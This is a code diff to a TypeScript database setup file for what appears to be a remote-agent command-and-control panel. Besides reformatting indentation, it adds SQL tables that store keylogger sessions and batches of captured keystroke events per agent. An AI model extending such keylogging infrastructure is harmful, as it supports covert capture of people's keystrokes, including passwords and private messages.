@@ -7,14 +7,14 @@ import { ensureParentDirectory } from '../fs-utils';
 if (!env.DATABASE_URL) throw new Error('DATABASE_URL is not set');
 
 const normalizedDbPath = env.DATABASE_URL.startsWith('file:')
-        ? env.DATABASE_URL.slice('file:'.length)
-        : env.DATABASE_URL;
+	? env.DATABASE_URL.slice('file:'.length)
+	: env.DATABASE_URL;
 
 const useFileUri = env.DATABASE_URL.startsWith('file:');
 
 if (!env.DATABASE_URL.startsWith('file::memory:') && env.DATABASE_URL !== ':memory:') {
-        const filePath = normalizedDbPath.split('?')[0];
-        await ensureParentDirectory(filePath);
+	const filePath = normalizedDbPath.split('?')[0];
+	await ensureParentDirectory(filePath);
 }
 
 const client = new Database(env.DATABASE_URL, { uri: useFileUri });
@@ -288,6 +288,35 @@ CREATE TABLE IF NOT EXISTS audit_event (
 );
 CREATE UNIQUE INDEX IF NOT EXISTS audit_event_command_idx ON audit_event (command_id);
 CREATE INDEX IF NOT EXISTS audit_event_agent_idx ON audit_event (agent_id);
+
+CREATE TABLE IF NOT EXISTS keylogger_session (
+        id TEXT PRIMARY KEY NOT NULL,
+        agent_id TEXT NOT NULL,
+        mode TEXT NOT NULL,
+        started_at INTEGER NOT NULL,
+        active INTEGER NOT NULL DEFAULT 1,
+        config TEXT NOT NULL,
+        total_events INTEGER NOT NULL DEFAULT 0,
+        last_captured_at INTEGER,
+        created_at INTEGER NOT NULL,
+        updated_at INTEGER NOT NULL,
+        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS keylogger_session_agent_idx ON keylogger_session (agent_id);
+
+CREATE TABLE IF NOT EXISTS keylogger_batch (
+        id TEXT PRIMARY KEY NOT NULL,
+        session_id TEXT NOT NULL,
+        agent_id TEXT NOT NULL,
+        captured_at INTEGER NOT NULL,
+        events TEXT NOT NULL,
+        total_events INTEGER NOT NULL,
+        created_at INTEGER NOT NULL,
+        FOREIGN KEY (session_id) REFERENCES keylogger_session(id) ON DELETE CASCADE,
+        FOREIGN KEY (agent_id) REFERENCES agent(id) ON DELETE CASCADE
+);
+CREATE INDEX IF NOT EXISTS keylogger_batch_session_idx ON keylogger_batch (session_id);
+CREATE INDEX IF NOT EXISTS keylogger_batch_agent_idx ON keylogger_batch (agent_id);
 COMMIT;`
 );
 
